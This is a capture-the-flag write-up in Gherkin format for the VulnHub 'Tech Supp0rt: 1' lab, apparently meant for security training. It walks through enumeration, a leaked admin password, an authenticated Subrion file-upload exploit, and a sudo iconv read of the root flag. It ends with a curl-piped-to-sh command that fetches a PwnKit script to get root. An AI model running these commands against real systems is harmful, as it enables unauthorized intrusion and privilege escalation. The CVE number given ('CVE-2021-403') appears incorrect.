## Version 1.4.1
## language: en

Feature:
  TOE:
    vulnhub Tech Supp0rt: 1
  Location:
    http://192.168.1.39/subrion/panel
  CWE:
    CWE-434: https://cwe.mitre.org/data/definitions/434.html
  Rule:
    REQ.004: https://docs.fluidattacks.com/criteria/vulnerabilities/004
    REQ.014: https://docs.fluidattacks.com/criteria/vulnerabilities/014
    REQ.020: https://docs.fluidattacks.com/criteria/vulnerabilities/020
    REQ.061: https://docs.fluidattacks.com/criteria/vulnerabilities/061
    REQ.359: https://docs.fluidattacks.com/criteria/vulnerabilities/359
  Goal:
    Get flag from root or get root privileges
  Recommendation:
    Upgrade system and tools like Subrion and don't save credentials in files

  Background:

  Hacker's software:
    | <Software name> | <Version> |
    | Kali linux | 5.10.28 |
    | Virtualbox | 6.1.34 |
    | Firefox | 91.9.0 |
    | Nmap | 7.92 |
    | Gobuster | 3.1.0 |
    | linpeas | 2.6.8 |
    | arp-scan | 1.9.7 |
    | python | 3.10.4 |
  TOE information:
    Given a .vmdk file
    Then I created a new linux virtual machine
    Then I selected the .vmdk file as the hard disk
    When I ran the file in Virtualbox
    Then I could see the virtual machine was running [evidence](01.png)
    And the server is running HTTP version Apache HTTPd 2.4.18
    And SSH version OpenSSH 7.2p2
    And Samba version smbd 3.X -4.X
    And Samba version smbd 4.3.11-Ubuntu

  Scenario: Normal use case
    Given access to a virtual server
    And a mac address [evidence](02.png)
    Then I execute the following commands:
    """
    $ nmap -sP 192.168.1.0/24
    $ sudo arp-scan -l
    """
    When looking at the result [evidence](03.png)
    Then I decided to visit the site:
    """
    http://192.168.1.39/
    """
    When looking in the browser
    Then I saw the initial apache2 configuration [evidence](04.png)

  Scenario: Dynamic detection
    Given an IPv4 address 192.168.1.39
    Then I ran a scan report
    And I execute the following command:
    """
    $ nmap -p- -sV -sC 192.168.1.39
    """
    Then I could see services and which ports were open [evidence](05.png)
    And I decided to explore the different ports
    Then I noted that port 80 was used by HTTP
    And its version Apache httpd 2.4.18
    When looking in the browser, I see the initial apache2 configuration
    Then I noted that port 22 was used by SSH in its version OpenSSH 7.2p2
    Then I noted that port 139 was used by samba in its version 3.X - 4.X
    Then I noted that port 445 was used by samba in its version 4.3.11-Ubuntu
    When looking for possible hidden directories with gobuster
    Then I execute the following command:
    """
    $ gobuster dir -u http://192.168.1.39
    -w /usr/share/wordlist/dirb/common.txt
    """
    Then I got some directories to search [evidence](06.png)
    When I checked, it there was a lot of data
    Then I tried other possibilities
    When looking for shared files in samba
    Then I execute the following command:
    """
    $ smbclient -L http://192.168.1.39
    """
    Then I found an open share name [evidence](07.png)
    Then I execute the following command:
    """
    $ smbclient -N \\\\192.168.1.39\\websvr [evidence](08.png)
    """
    Then I found just a file [evidence](09.png)
    When I checked it was a Subrion credential
    And information about a new web directory [evidence](10.png)
    When looking for a way to crack the password [evidence](11.png)
    Then I found the next web tool:
    """
    https://icyberchef.com/
    """
    Then I got "Scam2021" as the password [evidence](12.png)
    Then I decided to visit the site: [evidence](13.png)
    """
    http://192.168.1.39/subrion/panel
    """
    Then I log in with the given credentials
    And I gained access to the admin panel [evidence](14.png)
    When looking for information for a future exploit
    Then I got the Subrion version
    When looking for a Subrion CMS 4.2.1 vulnerability
    Then I found the following article [evidence](08.png)
    """
    https://www.exploit-db.com/exploits/49876
    """
    When I checked, it was something interesting
    And it was an arbitrary file upload
    And an authenticated remote code execution attack
    Then I could conclude that I can use Python3
    And exploit the Subrion CMS 4.2.1 vulnerability

  Scenario: Exploitation
    Given the site http://192.168.1.39/subrion/panel
    And the Subrion CMS 4.2.1 vulnerability
    Then I could execute the exploit file using Python3
    When I saw the command options [evidence](17.png)
    Then I execute the following command:
    """
    $ python3 Arbitrary_file_upload_subrion421.py
    -u http://192.168.1.39/subrion/panel
    -l admin -p Scam2021
    """
    Then I got a positive response
    And I gained access to the server [evidence](18.png)
    When I was looking for compromised information
    Then I got a username "scamsite" [evidence](19.png)
    And a wordpress config file [evidence](20.png)
    When looking at the file
    Then I got database credentials [evidence](21.png)
    Then I execute the following command:
    """
    $ ssh scamsite@192.168.1.39
    """
    Then I gained access as "scamsite" user [evidence](22.png)
    When looking for binaries with sudo access
    Then I execute the following command:
    """
    $ ssh scamsite@192.168.1.39
    """
    When I tested the credentials were valid
    Then I run the following command: [evidence](23.png)
    """
    $ sudo -l
    """
    Then I could see the sudo commands that I can run
    Then I looked for a binary misconfigured from the following site:
    """
    https://gtfobins.github.io/
    """
    When I found the results
    Then I could see an option to read unauthorized files [evidence](24.png)
    Then I used linpeas to fetch info
    And escalate permissions [evidence](25.png)
    When I got the results
    Then I could see the same option to read unauthorized files
    And the name of the file [evidence](26.png)
    And a possible exploit [evidence](27.png)
    Then I run the following command: [evidence](28.png)
    """
    $ sudo iconv -f 8859_1 -t 8859_1 "/root/root.txt"
    """
    Then I got the root flag
    When looking for CVE-2021-403 exploits
    Then I got the next command: [evidence](29.png)
    """
    $ sh -c "$(curl -fsSL
    https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
    """
    When I execute that command
    Then I got the flag
    And I become the root user [evidence](30.png)

  Scenario: Remediation
    Given that system has a vulnerability
    Then is necessary to upgrade the system and tools as Subrion
    Then is necessary avoid saving credentials in files
    And disable insecure features like binaries that can be run in sudo
    Then I can confirm that the server is less vulnerable

  Scenario: Scoring
    Severity scoring according to CVSSv3 standard
    Base: Attributes that are constants over time and organizations
      7.5/10 (High) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/
    Temporal: Attributes that measure the exploit's popularity and fixability
      7.0/10 (High) - E:F/RL:O/RC:C
    Environmental: Unique and relevant attributes to a specific user environment
      7.0/10 (High) - CR:M/IR:M/AR:M

  Scenario: Correlations
    No correlations have been found to this date 2022-07-13
